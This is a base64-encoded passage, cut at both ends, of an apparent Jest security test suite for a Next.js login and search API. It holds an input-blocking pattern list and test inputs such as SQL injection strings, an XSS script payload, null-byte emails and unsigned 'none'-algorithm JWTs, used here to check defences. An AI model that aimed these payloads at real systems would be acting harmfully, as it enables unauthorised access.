fVxuXG4gIC8vIEVtYWlsIGZvcm1hdCB2YWxpZGF0aW9uXG4gIGNvbnN0IGVtYWlsUmVnZXggPSAvXlteXFxzQF0rQFteXFxzQF0rXFwuW15cXHNAXSskLztcbiAgaWYgKCFlbWFpbFJlZ2V4LnRlc3QoZW1haWwpKSB7XG4gICAgcmV0dXJuIE5leHRSZXNwb25zZS5qc29uKFxuICAgICAgeyBlcnJvcjogJ0ludmFsaWQgZW1haWwgZm9ybWF0JyB9LFxuICAgICAgeyBzdGF0dXM6IDQwMCB9XG4gICAgKTtcbiAgfVxuXG4gIC8vIENoZWNrIGZvciBzdXNwaWNpb3VzIHBhdHRlcm5zXG4gIGNvbnN0IHN1c3BpY2lvdXNQYXR0ZXJucyA9IFtcbiAgICAvPHNjcmlwdC9pLFxuICAgIC9qYXZhc2NyaXB0Oi9pLFxuICAgIC9vblxcdys9L2ksXG4gICAgL1xcYm9yXFxiLipcXGIxXFxzKj1cXHMqMVxcYi9pLFxuICAgIC91bmlvbi4qc2VsZWN0L2ksXG4gICAgL2Ryb3AuKnRhYmxlL2ksXG4gIF07XG5cbiAgY29uc3QgaXNTdXNwaWNpb3VzID0gc3VzcGljaW91c1BhdHRlcm5zLnNvbWUocGF0dGVybiA9PiBcbiAgICBwYXR0ZXJuLnRlc3QoZW1haWwpIHx8IHBhdHRlcm4udGVzdChwYXNzd29yZClcbiAgKTtcblxuICBpZiAoaXNTdXNwaWNpb3VzKSB7XG4gICAgcmV0dXJuIE5leHRSZXNwb25zZS5qc29uKFxuICAgICAgeyBlcnJvcjogJ0ludmFsaWQgaW5wdXQgZGV0ZWN0ZWQnIH0sXG4gICAgICB7IHN0YXR1czogNDAwIH1cbiAgICApO1xuICB9XG5cbiAgdHJ5IHtcbiAgICBjb25zdCB1c2VyID0gYXdhaXQgbW9ja1ByaXNtYS51c2VyLmZpbmRVbmlxdWUoe1xuICAgICAgd2hlcmU6IHsgZW1haWwgfSxcbiAgICB9KTtcblxuICAgIGlmICghdXNlcikge1xuICAgICAgLy8gQ29uc3RhbnQgdGltZSBkZWxheSB0byBwcmV2ZW50IHRpbWluZyBhdHRhY2tzXG4gICAgICBhd2FpdCBuZXcgUHJvbWlzZShyZXNvbHZlID0+IHNldFRpbWVvdXQocmVzb2x2ZSwgMTAwKSk7XG4gICAgICByZXR1cm4gTmV4dFJlc3BvbnNlLmpzb24oXG4gICAgICAgIHsgZXJyb3I6ICdJbnZhbGlkIGNyZWRlbnRpYWxzJyB9LFxuICAgICAgICB7IHN0YXR1czogNDAxIH1cbiAgICAgICk7XG4gICAgfVxuXG4gICAgY29uc3QgaXNWYWxpZCA9IGF3YWl0IGJjcnlwdC5jb21wYXJlKHBhc3N3b3JkLCB1c2VyLnBhc3N3b3JkKTtcbiAgICBpZiAoIWlzVmFsaWQpIHtcbiAgICAgIHJldHVybiBOZXh0UmVzcG9uc2UuanNvbihcbiAgICAgICAgeyBlcnJvcjogJ0ludmFsaWQgY3JlZGVudGlhbHMnIH0sXG4gICAgICAgIHsgc3RhdHVzOiA0MDEgfVxuICAgICAgKTtcbiAgICB9XG5cbiAgICAvLyBHZW5lcmF0ZSBzZWN1cmUgdG9rZW5cbiAgICBjb25zdCB0b2tlbiA9IGp3dC5zaWduKFxuICAgICAgeyBcbiAgICAgICAgdXNlcklkOiB1c2VyLmlkLCBcbiAgICAgICAgZW1haWw6IHVzZXIuZW1haWwsXG4gICAgICAgIGlhdDogTWF0aC5mbG9vcihEYXRlLm5vdygpIC8gMTAwMCksXG4gICAgICB9LFxuICAgICAgcHJvY2Vzcy5lbnYuSldUX1NFQ1JFVCB8fCAndGVzdC1zZWNyZXQnLFxuICAgICAgeyBcbiAgICAgICAgZXhwaXJlc0luOiAnMTVtJyxcbiAgICAgICAgaXNzdWVyOiAnbWQtc3BvcnRzJyxcbiAgICAgICAgYXVkaWVuY2U6ICdtZC1zcG9ydHMtY2xpZW50JyxcbiAgICAgIH1cbiAgICApO1xuXG4gICAgcmV0dXJuIE5leHRSZXNwb25zZS5qc29uKHtcbiAgICAgIHVzZXI6IHtcbiAgICAgICAgaWQ6IHVzZXIuaWQsXG4gICAgICAgIGVtYWlsOiB1c2VyLmVtYWlsLFxuICAgICAgICBuYW1lOiB1c2VyLm5hbWUsXG4gICAgICB9LFxuICAgICAgdG9rZW4sXG4gICAgfSk7XG4gIH0gY2F0Y2ggKGVycm9yKSB7XG4gICAgcmV0dXJuIE5leHRSZXNwb25zZS5qc29uKFxuICAgICAgeyBlcnJvcjogJ0ludGVybmFsIHNlcnZlciBlcnJvcicgfSxcbiAgICAgIHsgc3RhdHVzOiA1MDAgfVxuICAgICk7XG4gIH1cbn07XG5cbmRlc2NyaWJlKCdTZWN1cml0eSBUZXN0cycsICgpID0+IHtcbiAgYmVmb3JlQWxsKCgpID0+IHtcbiAgICBwcm9jZXNzLmVudi5KV1RfU0VDUkVUID0gJ3Rlc3Qtc2VjcmV0LWtleS1mb3Itc2VjdXJpdHktdGVzdGluZyc7XG4gIH0pO1xuXG4gIGJlZm9yZUVhY2goKCkgPT4ge1xuICAgIGplc3QuY2xlYXJBbGxNb2NrcygpO1xuICB9KTtcblxuICBkZXNjcmliZSgnU1FMIEluamVjdGlvbiBQcm90ZWN0aW9uJywgKCkgPT4ge1xuICAgIGl0KCdzaG91bGQgcHJldmVudCBTUUwgaW5qZWN0aW9uIGluIHNlYXJjaCBxdWVyaWVzJywgYXN5bmMgKCkgPT4ge1xuICAgICAgY29uc3Qgc3FsUGF5bG9hZHMgPSBTZWN1cml0eVRlc3RVdGlscy5nZW5lcmF0ZVNRTEluamVjdGlvblBheWxvYWRzKCk7XG4gICAgICBcbiAgICAgIGZvciAoY29uc3QgcGF5bG9hZCBvZiBzcWxQYXlsb2Fkcykge1xuICAgICAgICBjb25zdCByZXF1ZXN0ID0gbmV3IE5leHRSZXF1ZXN0KFxuICAgICAgICAgIGBodHRwOi8vbG9jYWxob3N0OjMwMDAvYXBpL3NlYXJjaD9xPSR7ZW5jb2RlVVJJQ29tcG9uZW50KHBheWxvYWQpfWBcbiAgICAgICAgKTtcblxuICAgICAgICAvLyBUZXN0IHdpdGggc2VjdXJlIGhhbmRsZXJcbiAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBzZWN1cmVTZWFyY2hIYW5kbGVyKHJlcXVlc3QpO1xuICAgICAgICBcbiAgICAgICAgLy8gU2hvdWxkIG5vdCByZXR1cm4gNTAwIGVycm9yIG9yIGV4cG9zZSBkYXRhYmFzZSBzdHJ1Y3R1cmVcbiAgICAgICAgZXhwZWN0KHJlc3BvbnNlLnN0YXR1cykubm90LnRvQmUoNTAwKTtcbiAgICAgICAgXG4gICAgICAgIGNvbnN0IGRhdGEgPSBhd2FpdCByZXNwb25zZS5qc29uKCk7XG4gICAgICAgIGV4cGVjdChkYXRhKS5ub3QudG9IYXZlUHJvcGVydHkoJ3Jlc3VsdHMnKTtcbiAgICAgIH1cbiAgICB9KTtcblxuICAgIGl0KCdzaG91bGQgdXNlIHBhcmFtZXRlcml6ZWQgcXVlcmllcycsIGFzeW5jICgpID0+IHtcbiAgICAgIG1vY2tQcmlzbWEucHJvZHVjdC5maW5kTWFueS5tb2NrUmVzb2x2ZWRWYWx1ZShbXSk7XG4gICAgICBcbiAgICAgIGNvbnN0IHJlcXVlc3QgPSBuZXcgTmV4dFJlcXVlc3QoXG4gICAgICAgIFwiaHR0cDovL2xvY2FsaG9zdDozMDAwL2FwaS9zZWFyY2g/cT10ZXN0JyBPUiAnMSc9JzFcIlxuICAgICAgKTtcblxuICAgICAgYXdhaXQgc2VjdXJlU2VhcmNoSGFuZGxlcihyZXF1ZXN0KTtcbiAgICAgIFxuICAgICAgLy8gVmVyaWZ5IHBhcmFtZXRlcml6ZWQgcXVlcnkgd2FzIHVzZWRcbiAgICAgIGV4cGVjdChtb2NrUHJpc21hLnByb2R1Y3QuZmluZE1hbnkpLnRvSGF2ZUJlZW5DYWxsZWRXaXRoKHtcbiAgICAgICAgd2hlcmU6IHtcbiAgICAgICAgICBuYW1lOiB7XG4gICAgICAgICAgICBjb250YWluczogXCJ0ZXN0IE9SIDExXCIsIC8vIFNhbml0aXplZFxuICAgICAgICAgICAgbW9kZTogJ2luc2Vuc2l0aXZlJyxcbiAgICAgICAgICB9LFxuICAgICAgICB9LFxuICAgICAgfSk7XG4gICAgfSk7XG4gIH0pO1xuXG4gIGRlc2NyaWJlKCdYU1MgUHJvdGVjdGlvbicsICgpID0+IHtcbiAgICBpdCgnc2hvdWxkIHNhbml0aXplIFhTUyBwYXlsb2FkcyBpbiBpbnB1dCcsIGFzeW5jICgpID0+IHtcbiAgICAgIGNvbnN0IHhzc1BheWxvYWRzID0gU2VjdXJpdHlUZXN0VXRpbHMuZ2VuZXJhdGVYU1NQYXlsb2FkcygpO1xuICAgICAgXG4gICAgICBmb3IgKGNvbnN0IHBheWxvYWQgb2YgeHNzUGF5bG9hZHMpIHtcbiAgICAgICAgY29uc3QgcmVxdWVzdCA9IG5ldyBOZXh0UmVxdWVzdChcbiAgICAgICAgICBgaHR0cDovL2xvY2FsaG9zdDozMDAwL2FwaS9zZWFyY2g/cT0ke2VuY29kZVVSSUNvbXBvbmVudChwYXlsb2FkKX1gXG4gICAgICAgICk7XG5cbiAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBzZWN1cmVTZWFyY2hIYW5kbGVyKHJlcXVlc3QpO1xuICAgICAgICBjb25zdCBkYXRhID0gYXdhaXQgcmVzcG9uc2UuanNvbigpO1xuICAgICAgICBcbiAgICAgICAgLy8gU2hvdWxkIG5vdCBjb250YWluIHNjcmlwdCB0YWdzIG9yIGphdmFzY3JpcHRcbiAgICAgICAgaWYgKGRhdGEucmVzdWx0cykge1xuICAgICAgICAgIGNvbnN0IHJlc3BvbnNlU3RyID0gSlNPTi5zdHJpbmdpZnkoZGF0YSk7XG4gICAgICAgICAgZXhwZWN0KHJlc3BvbnNlU3RyKS5ub3QudG9NYXRjaCgvPHNjcmlwdC9pKTtcbiAgICAgICAgICBleHBlY3QocmVzcG9uc2VTdHIpLm5vdC50b01hdGNoKC9qYXZhc2NyaXB0Oi9pKTtcbiAgICAgICAgICBleHBlY3QocmVzcG9uc2VTdHIpLm5vdC50b01hdGNoKC9vblxcdys9L2kpO1xuICAgICAgICB9XG4gICAgICB9XG4gICAgfSk7XG5cbiAgICBpdCgnc2hvdWxkIHJlamVjdCBzdXNwaWNpb3VzIGlucHV0IHBhdHRlcm5zJywgYXN5bmMgKCkgPT4ge1xuICAgICAgY29uc3QgcmVxdWVzdCA9IG5ldyBOZXh0UmVxdWVzdCgnaHR0cDovL2xvY2FsaG9zdDozMDAwL2FwaS9hdXRoL2xvZ2luJywge1xuICAgICAgICBtZXRob2Q6ICdQT1NUJyxcbiAgICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkoe1xuICAgICAgICAgIGVtYWlsOiAnPHNjcmlwdD5hbGVydChcInhzc1wiKTwvc2NyaXB0PkB0ZXN0LmNvbScsXG4gICAgICAgICAgcGFzc3dvcmQ6ICdwYXNzd29yZDEyMycsXG4gICAgICAgIH0pLFxuICAgICAgICBoZWFkZXJzOiB7XG4gICAgICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJyxcbiAgICAgICAgfSxcbiAgICAgIH0pO1xuXG4gICAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IHNlY3VyZUF1dGhIYW5kbGVyKHJlcXVlc3QpO1xuICAgICAgY29uc3QgZGF0YSA9IGF3YWl0IHJlc3BvbnNlLmpzb24oKTtcbiAgICAgIFxuICAgICAgZXhwZWN0KHJlc3BvbnNlLnN0YXR1cykudG9CZSg0MDApO1xuICAgICAgZXhwZWN0KGRhdGEuZXJyb3IpLnRvQmUoJ0ludmFsaWQgaW5wdXQgZGV0ZWN0ZWQnKTtcbiAgICB9KTtcbiAgfSk7XG5cbiAgZGVzY3JpYmUoJ0F1dGhlbnRpY2F0aW9uIFNlY3VyaXR5JywgKCkgPT4ge1xuICAgIGl0KCdzaG91bGQgcmVqZWN0IGludmFsaWQgSldUIHRva2VucycsIGFzeW5jICgpID0+IHtcbiAgICAgIGNvbnN0IGludmFsaWRUb2tlbnMgPSBTZWN1cml0eVRlc3RVdGlscy5nZW5lcmF0ZUludmFsaWRUb2tlbnMoKTtcbiAgICAgIFxuICAgICAgZm9yIChjb25zdCB0b2tlbiBvZiBpbnZhbGlkVG9rZW5zKSB7XG4gICAgICAgIGV4cGVjdCgoKSA9PiB7XG4gICAgICAgICAgand0LnZlcmlmeSh0b2tlbiwgcHJvY2Vzcy5lbnYuSldUX1NFQ1JFVCEpO1xuICAgICAgICB9KS50b1Rocm93KCk7XG4gICAgICB9XG4gICAgfSk7XG5cbiAgICBpdCgnc2hvdWxkIHJlamVjdCBleHBpcmVkIHRva2VucycsIGFzeW5jICgpID0+IHtcbiAgICAgIGNvbnN0IGV4cGlyZWRUb2tlbiA9IFNlY3VyaXR5VGVzdFV0aWxzLmdlbmVyYXRlRXhwaXJlZEpXVCh7XG4gICAgICAgIHVzZXJJZDogMSxcbiAgICAgICAgZW1haWw6ICd0ZXN0QGV4YW1wbGUuY29tJyxcbiAgICAgIH0pO1xuICAgICAgXG4gICAgICBleHBlY3QoKCkgPT4ge1xuICAgICAgICBqd3QudmVyaWZ5KGV4cGlyZWRUb2tlbiwgcHJvY2Vzcy5lbnYuSldUX1NFQ1JFVCEpO1xuICAgICAgfSkudG9UaHJvdygnand0IGV4cGlyZWQnKTtcbiAgICB9KTtcblxuICAgIGl0KCdzaG91bGQgdXNlIHNlY3VyZSBwYXNzd29yZCBoYXNoaW5nJywgYXN5bmMgKCkgPT4ge1xuICAgICAgY29uc3QgcGFzc3dvcmQgPSAndGVzdHBhc3N3b3JkMTIzJztcbiAgICAgIGNvbnN0IGhhc2ggPSBhd2FpdCBTZWN1cml0eVRlc3RVdGlscy5oYXNoUGFzc3dvcmQocGFzc3dvcmQpO1xuICAgICAgXG4gICAgICAvLyBTaG91bGQgYmUgYmNyeXB0IGhhc2hcbiAgICAgIGV4cGVjdChoYXNoKS50b01hdGNoKC9eXFwkMlthYnldXFwkXFxkK1xcJC8pO1xuICAgICAgXG4gICAgICAvLyBTaG91bGQgbm90IGJlIHRoZSBvcmlnaW5hbCBwYXNzd29yZFxuICAgICAgZXhwZWN0KGhhc2gpLm5vdC50b0JlKHBhc3N3b3JkKTtcbiAgICAgIFxuICAgICAgLy8gU2hvdWxkIHZlcmlmeSBjb3JyZWN0bHlcbiAgICAgIGNvbnN0IGlzVmFsaWQgPSBhd2FpdCBiY3J5cHQuY29tcGFyZShwYXNzd29yZCwgaGFzaCk7XG4gICAgICBleHBlY3QoaXNWYWxpZCkudG9CZSh0cnVlKTtcbiAgICAgIFxuICAgICAgLy8gU2hvdWxkIG5vdCB2ZXJpZnkgd2l0aCB3cm9uZyBwYXNzd29yZFxuICAgICAgY29uc3QgaXNJbnZhbGlkID0gYXdhaXQgYmNyeXB0LmNvbXBhcmUoJ3dyb25ncGFzc3dvcmQnLCBoYXNoKTtcbiAgICAgIGV4cGVjdChpc0ludmFsaWQpLnRvQmUoZmFsc2UpO1xuICAgIH0pO1xuXG4gICAgaXQoJ3Nob3VsZCBwcmV2ZW50IHRpbWluZyBhdHRhY2tzIGluIGF1dGhlbnRpY2F0aW9uJywgYXN5bmMgKCkgPT4ge1xuICAgICAgY29uc3QgdmFsaWRFbWFpbCA9ICd0ZXN0QGV4YW1wbGUuY29tJztcbiAgICAgIGNvbnN0IGludmFsaWRFbWFpbCA9ICdub25leGlzdGVudEBleGFtcGxlLmNvbSc7XG4gICAgICBcbiAgICAgIC8vIE1vY2sgdXNlciBsb29rdXBcbiAgICAgIG1vY2tQcmlzbWEudXNlci5maW5kVW5pcXVlLm1vY2tJbXBsZW1lbnRhdGlvbigoeyB3aGVyZSB9KSA9PiB7XG4gICAgICAgIGlmICh3aGVyZS5lbWFpbCA9PT0gdmFsaWRFbWFpbCkge1xuICAgICAgICAgIHJldHVybiBQcm9taXNlLnJlc29sdmUoe1xuICAgICAgICAgICAgaWQ6IDEsXG4gICAgICAgICAgICBlbWFpbDogdmFsaWRFbWFpbCxcbiAgICAgICAgICAgIHBhc3N3b3JkOiAnJDJhJDEwJGhhc2hlZFBhc3N3b3JkJyxcbiAgICAgICAgICAgIG5hbWU6ICdUZXN0IFVzZXInLFxuICAgICAgICAgIH0pO1xuICAgICAgICB9XG4gICAgICAgIHJldHVybiBQcm9taXNlLnJlc29sdmUobnVsbCk7XG4gICAgICB9KTtcblxuICAgICAgY29uc3QgdmFsaWRSZXF1ZXN0ID0gbmV3IE5leHRSZXF1ZXN0KCdodHRwOi8vbG9jYWxob3N0OjMwMDAvYXBpL2F1dGgvbG9naW4nLCB7XG4gICAgICAgIG1ldGhvZDogJ1BPU1QnLFxuICAgICAgICBib2R5OiBKU09OLnN0cmluZ2lmeSh7XG4gICAgICAgICAgZW1haWw6IHZhbGlkRW1haWwsXG4gICAgICAgICAgcGFzc3dvcmQ6ICd3cm9uZ3Bhc3N3b3JkJyxcbiAgICAgICAgfSksXG4gICAgICAgIGhlYWRlcnM6IHtcbiAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLFxuICAgICAgICB9LFxuICAgICAgfSk7XG5cbiAgICAgIGNvbnN0IGludmFsaWRSZXF1ZXN0ID0gbmV3IE5leHRSZXF1ZXN0KCdodHRwOi8vbG9jYWxob3N0OjMwMDAvYXBpL2F1dGgvbG9naW4nLCB7XG4gICAgICAgIG1ldGhvZDogJ1BPU1QnLFxuICAgICAgICBib2R5OiBKU09OLnN0cmluZ2lmeSh7XG4gICAgICAgICAgZW1haWw6IGludmFsaWRFbWFpbCxcbiAgICAgICAgICBwYXNzd29yZDogJ3dyb25ncGFzc3dvcmQnLFxuICAgICAgICB9KSxcbiAgICAgICAgaGVhZGVyczoge1xuICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsXG4gICAgICAgIH0sXG4gICAgICB9KTtcblxuICAgICAgLy8gTWVhc3VyZSByZXNwb25zZSB0aW1lc1xuICAgICAgY29uc3Qgc3RhcnQxID0gRGF0ZS5ub3coKTtcbiAgICAgIGNvbnN0IHJlc3BvbnNlMSA9IGF3YWl0IHNlY3VyZUF1dGhIYW5kbGVyKHZhbGlkUmVxdWVzdCk7XG4gICAgICBjb25zdCB0aW1lMSA9IERhdGUubm93KCkgLSBzdGFydDE7XG5cbiAgICAgIGNvbnN0IHN0YXJ0MiA9IERhdGUubm93KCk7XG4gICAgICBjb25zdCByZXNwb25zZTIgPSBhd2FpdCBzZWN1cmVBdXRoSGFuZGxlcihpbnZhbGlkUmVxdWVzdCk7XG4gICAgICBjb25zdCB0aW1lMiA9IERhdGUubm93KCkgLSBzdGFydDI7XG5cbiAgICAgIC8vIEJvdGggc2hvdWxkIHJldHVybiA0MDFcbiAgICAgIGV4cGVjdChyZXNwb25zZTEuc3RhdHVzKS50b0JlKDQwMSk7XG4gICAgICBleHBlY3QocmVzcG9uc2UyLnN0YXR1cykudG9CZSg0MDEpO1xuICAgICAgXG4gICAgICAvLyBSZXNwb25zZSB0aW1lcyBzaG91bGQgYmUgc2ltaWxhciAod2l0aGluIDUwbXMpXG4gICAgICBleHBlY3QoTWF0aC5hYnModGltZTEgLSB0aW1lMikpLnRvQmVMZXNzVGhhbig1MCk7XG4gICAgfSk7XG4gIH0pO1xuXG4gIGRlc2NyaWJlKCdJbnB1dCBWYWxpZGF0aW9uJywgKCkgPT4ge1xuICAgIGl0KCdzaG91bGQgcmVqZWN0IG92ZXJzaXplZCBpbnB1dHMnLCBhc3luYyAoKSA9PiB7XG4gICAgICBjb25zdCBsb25nU3RyaW5ncyA9IFNlY3VyaXR5VGVzdFV0aWxzLmdlbmVyYXRlTG9uZ1N0cmluZ3MoKTtcbiAgICAgIFxuICAgICAgZm9yIChjb25zdCBsb25nU3RyaW5nIG9mIGxvbmdTdHJpbmdzKSB7XG4gICAgICAgIGNvbnN0IHJlcXVlc3QgPSBuZXcgTmV4dFJlcXVlc3QoJ2h0dHA6Ly9sb2NhbGhvc3Q6MzAwMC9hcGkvYXV0aC9sb2dpbicsIHtcbiAgICAgICAgICBtZXRob2Q6ICdQT1NUJyxcbiAgICAgICAgICBib2R5OiBKU09OLnN0cmluZ2lmeSh7XG4gICAgICAgICAgICBlbWFpbDogbG9uZ1N0cmluZyxcbiAgICAgICAgICAgIHBhc3N3b3JkOiAncGFzc3dvcmQxMjMnLFxuICAgICAgICAgIH0pLFxuICAgICAgICAgIGhlYWRlcnM6IHtcbiAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsXG4gICAgICAgICAgfSxcbiAgICAgICAgfSk7XG5cbiAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBzZWN1cmVBdXRoSGFuZGxlcihyZXF1ZXN0KTtcbiAgICAgICAgXG4gICAgICAgIGV4cGVjdChyZXNwb25zZS5zdGF0dXMpLnRvQmUoNDAwKTtcbiAgICAgIH1cbiAgICB9KTtcblxuICAgIGl0KCdzaG91bGQgdmFsaWRhdGUgZW1haWwgZm9ybWF0JywgYXN5bmMgKCkgPT4ge1xuICAgICAgY29uc3QgaW52YWxpZEVtYWlscyA9IFtcbiAgICAgICAgJ2ludmFsaWQtZW1haWwnLFxuICAgICAgICAnQGRvbWFpbi5jb20nLFxuICAgICAgICAndXNlckAnLFxuICAgICAgICAndXNlci4ubmFtZUBkb21haW4uY29tJyxcbiAgICAgICAgJ3VzZXJAZG9tYWluJyxcbiAgICAgICAgJycsXG4gICAgICAgICd1c2VyIG5hbWVAZG9tYWluLmNvbScsXG4gICAgICBdO1xuICAgICAgXG4gICAgICBmb3IgKGNvbnN0IGVtYWlsIG9mIGludmFsaWRFbWFpbHMpIHtcbiAgICAgICAgY29uc3QgcmVxdWVzdCA9IG5ldyBOZXh0UmVxdWVzdCgnaHR0cDovL2xvY2FsaG9zdDozMDAwL2FwaS9hdXRoL2xvZ2luJywge1xuICAgICAgICAgIG1ldGhvZDogJ1BPU1QnLFxuICAgICAgICAgIGJvZHk6IEpTT04uc3RyaW5naWZ5KHtcbiAgICAgICAgICAgIGVtYWlsLFxuICAgICAgICAgICAgcGFzc3dvcmQ6ICdwYXNzd29yZDEyMycsXG4gICAgICAgICAgfSksXG4gICAgICAgICAgaGVhZGVyczoge1xuICAgICAgICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJyxcbiAgICAgICAgICB9LFxuICAgICAgICB9KTtcblxuICAgICAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IHNlY3VyZUF1dGhIYW5kbGVyKHJlcXVlc3QpO1xuICAgICAgICBjb25zdCBkYXRhID0gYXdhaXQgcmVzcG9uc2UuanNvbigpO1xuICAgICAgICBcbiAgICAgICAgZXhwZWN0KHJlc3BvbnNlLnN0YXR1cykudG9CZSg0MDApO1xuICAgICAgICBleHBlY3QoZGF0YS5lcnJvcikudG9CZSgnSW52YWxpZCBlbWFpbCBmb3JtYXQnKTtcbiAgICAgIH1cbiAgICB9KTtcblxuICAgIGl0KCdzaG91bGQgaGFuZGxlIG51bGwgYnl0ZXMgYW5kIHNwZWNpYWwgY2hhcmFjdGVycycsIGFzeW5jICgpID0+IHtcbiAgICAgIGNvbnN0IG1hbGljaW91c0lucHV0cyA9IFtcbiAgICAgICAgJ3Rlc3RcXHgwMEBleGFtcGxlLmNvbScsXG4gICAgICAgICd0ZXN0XFxyXFxuQGV4YW1wbGUuY29tJyxcbiAgICAgICAgJ3Rlc3RcXHRAZXhhbXBsZS5jb20nLFxuICAgICAgICAndGVzdFxcYkBleGFtcGxlLmNvbScsXG4gICAgICBdO1xuICAgICAgXG4gICAgICBmb3IgKGNvbnN0IGlucHV0IG9mIG1hbGljaW91c0lucHV0cykge1xuICAgICAgICBjb25zdCByZXF1ZXN0ID0gbmV3IE5leHRSZXF1ZXN0KCdodHRwOi8vbG9jYWxob3N0OjMwMDAvYXBpL2F1dGgvbG9naW4nLCB7XG4gICAgICAgICAgbWV0aG9kOiAnUE9TVCcsXG4gICAgICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkoe1xuICAgICAgICAgICAgZW1haWw6IGlucHV0LFxuICAgICAgICAgICAgcGFzc3dvcmQ6ICdwYXNzd29yZDEyMycsXG4gICAgICAgICAgfSksXG4gICAgICAgICAgaGVhZGVyczoge1xuICAgICAgICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJyxcbiAgICAgICAgICB9LFxuICAgICAgICB9KTtcblxuICAgICAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IHNlY3VyZUF1dGhIYW5kbGVyKHJlcXVlc3QpO1xuICAgICAgICBcbiAgICAgICAgZXhwZWN0KHJlc3BvbnNlLnN0YXR1cykudG9CZSg0MDApO1xuICAgICAgfVxuICAgIH0pO1xuICB9KTtcblxuICBkZXNjcmliZSgnQ29tbWFuZCBJbmplY3Rpb24gUHJvdGVjdGlvbicsICgpID0+IHtcbiAgICBpdCgnc2hvdWxkIHByZXZlbnQgY29tbWFuZCBpbmplY3Rpb24gaW4gZmlsZSBvcGVyYXRpb25zJywgKCkgPT4ge1xuICAgICAgY29uc3QgY29tbWFuZFBheWxvYWRzID0gU2VjdXJpdHlUZXN0VXRpbHMuZ2VuZXJhdGVDb21tYW5kSW5qZWN0aW9uUGF5bG9hZHMoKTtcbiAgICAgIFxuICAgICAgZm9yIChjb25zdCBwYXlsb2FkIG9mIGNvbW1hbmRQYXlsb2Fkcykge1xuICAgICAgICAvLyBTaW11bGF0ZSBmaWxlIG5hbWUgdmFsaWRhdGlvblxuICAgICAgICBjb25zdCBpc1ZhbGlkRmlsZU5hbWUgPSAoZmlsZW5hbWU6IHN0cmluZyk6IGJvb2xlYW4gPT4ge1xuICAgICAgICAgIC8vIE9ubHkgYWxsb3cgYWxwaGFudW1lcmljLCBkb3RzLCBoeXBoZW5zLCBhbmQgdW5kZXJzY29yZXNcbiAgICAgICAgICByZXR1cm4gL15bYS16QS1aMC05Ll8tXSskLy50ZXN0KGZpbGVuYW1lKTtcbiAgICAgICAgfTtcbiAgICAgICAgXG4gICAgICAgIGV4cGVjdChpc1ZhbGlkRmlsZU5hbWUocGF5bG9hZCkpLnRvQmUoZmFsc2UpO1xuICAgICAgfVxuICAgIH0pO1xuICB9KTtcblxuICBkZXNjcmliZSgnSldUIFNlY3VyaXR5JywgKCkgPT4ge1xuICAgIGl0KCdzaG91bGQgdXNlIHNlY3VyZSBKV1QgY29uZmlndXJhdGlvbicsICgpID0+IHtcbiAgICAgIGNvbnN0IHBheWxvYWQgPSB7IHVzZXJJZDogMSwgZW1haWw6ICd0ZXN0QGV4YW1wbGUuY29tJyB9O1xuICAgICAgY29uc3QgdG9rZW4gPSBTZWN1cml0eVRlc3RVdGlscy5nZW5lcmF0ZVZhbGlkSldUKHBheWxvYWQpO1xuICAgICAgXG4gICAgICBjb25zdCBkZWNvZGVkID0gand0LnZlcmlmeSh0b2tlbiwgcHJvY2Vzcy5lbnYuSldUX1NFQ1JFVCEpIGFzIGFueTtcbiAgICAgIFxuICAgICAgZXhwZWN0KGRlY29kZWQudXNlcklkKS50b0JlKDEpO1xuICAgICAgZXhwZWN0KGRlY29kZWQuZW1haWwpLnRvQmUoJ3Rlc3RAZXhhbXBsZS5jb20nKTtcbiAgICAgIGV4cGVjdChkZWNvZGVkLmlhdCkudG9CZURlZmluZWQoKTtcbiAgICAgIGV4cGVjdChkZWNvZGVkLmV4cCkudG9CZURlZmluZWQoKTtcbiAgICB9KTtcblxuICAgIGl0KCdzaG91bGQgbm90IGFjY2VwdCB0b2tlbnMgd2l0aCBub25lIGFsZ29yaXRobScsICgpID0+IHtcbiAgICAgIC8vIENyZWF0ZSBhIHRva2VuIHdpdGggJ25vbmUnIGFsZ29yaXRobSAoc2VjdXJpdHkgdnVsbmVyYWJpbGl0eSlcbiAgICAgIGNvbnN0IGhlYWRlciA9IEJ1ZmZlci5mcm9tKEpTT04uc3RyaW5naWZ5KHsgYWxnOiAnbm9uZScsIHR5cDogJ0pXVCcgfSkpLnRvU3RyaW5nKCdiYXNlNjR1cmwnKTtcbiAgICAgIGNvbnN0IHBheWxvYWQgPSBCdWZmZXIuZnJvbShKU09OLnN0cmluZ2lmeSh7IHVzZXJJZDogMSwgZW1haWw6ICd0ZXN0QGV4YW1wbGUuY29tJyB9KSkudG9TdHJpbmcoJ2Jhc2U2NHVybCcpO1xuICAgICAgY29uc3Qgbm9uZVRva2VuID0gYCR7aGVhZGVyfS4ke3BheWxvYWR9LmA7XG4gICAgICBcbiAgICAgIGV4cGVjdCgoKSA9PiB7XG4gICAgICAgIGp3dC52ZXJpZnkobm9uZVRva2VuLCBwcm9jZXNzLmVudi5KV1RfU0VDUkVUISk7XG4gICAgICB9KS50b1Rocm93KCk7XG4gICAgfSk7XG5cbiAgICBpdCgnc2hvdWxkIHZhbGlkYXRlIHRva2VuIHNpZ25hdHVyZScsICgpID0+IHtcbiAgICAgIGNvbnN0IHZhbGlkVG9rZW4gPSBTZWN1cml0eVRlc3RVdGlscy5nZW5lcmF0ZVZhbGlkSldUKHsgdXNlcklkOiAxIH0pO1xuICAgICAgY29uc3QgW2hlYWRlciwgcGF5bG9hZF0gPSB2YWxpZFRva2VuLnNwbGl0KCcuJyk7XG4gICAgICBjb25zdCB0YW1wZXJlZFRva2VuID0gYCR7aGVhZGVyfS4ke